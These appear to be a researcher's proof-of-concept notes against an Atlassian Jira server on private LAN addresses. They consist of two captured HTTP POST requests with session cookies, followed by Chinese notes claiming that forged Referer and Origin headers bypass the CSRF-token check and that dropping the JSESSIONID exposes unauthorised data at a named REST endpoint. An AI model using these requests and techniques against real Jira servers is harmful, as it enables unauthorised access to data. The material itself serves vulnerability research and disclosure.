POST /rest/webResources/1.0/resources HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Referer: http://192.168.1.174:8080/secure/Dashboard.jspa
Origin: http://192.168.1.174:8080
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
Content-Type: application/json
Content-Length: 372
Cookie: atlassian.xsrf.token=BRT3-0ULN-F448-KLOV|95c67182b6b29877d78dc99ce267d973d16073ae|lout; JSESSIONID=4C17AC1A9308A3B62DC693BFA8F07FD8
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Host: 192.168.1.174:8080
Pragma: no-cache
Cache-Control: no-cache

{"r":[],"c":["jira.webresources:mentions-feature"],"xc":["_super","atl.dashboard","atl.general","jira.general","jira.global"],"xr":["jira.webresources:calendar-lib","com.atlassian.auiplugin:aui-labels","jira.webresources:global-static","jira.webresources:groupbrowser","jira.webresources:group-pickers","com.atlassian.feedback.jira-feedback-plugin:button-resources-init"]}


POST /rest/webResources/1.0/resources HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Referer: http://192.168.1.174:8080/secure/AboutPage.jspa/secure/AboutPage.jspa
Origin: http://192.168.1.174:8080
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0
Content-Type: application/json
Content-Length: 398
Cookie: atlassian.xsrf.token=BRT3-0ULN-F448-KLOV|95c67182b6b29877d78dc99ce267d973d16073ae|lout; JSESSIONID=4C17AC1A9308A3B62DC693BFA8F07FD8
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept-Language: zh-CN,en,*
Host: 192.168.1.174:8080
Pragma: no-cache
Cache-Control: no-cache

{"r":[],"c":["browser-metrics-plugin.contrib"],"xc":["_super","atl.general","jira.general","jira.global","atl.global"],"xr":["jira.webresources:calendar-lib","jira.webresources:autocomplete","jira.webresources:groupbrowser","jira.webresources:group-pickers","com.atlassian.auiplugin:aui-labels","jira.webresources:global-static","com.atlassian.feedback.jira-feedback-plugin:button-resources-init"]}

通过伪造 Referer和Origin 可绕过 csrf-token校验

Referer: http://192.168.1.179:8081/secure/Dashboard.jspa
Origin: http://192.168.1.179:8081

删除 jsessionid 获取非授权数据
http://192.168.1.179:8081/rest/issueNav/1/issueNav/operations/views
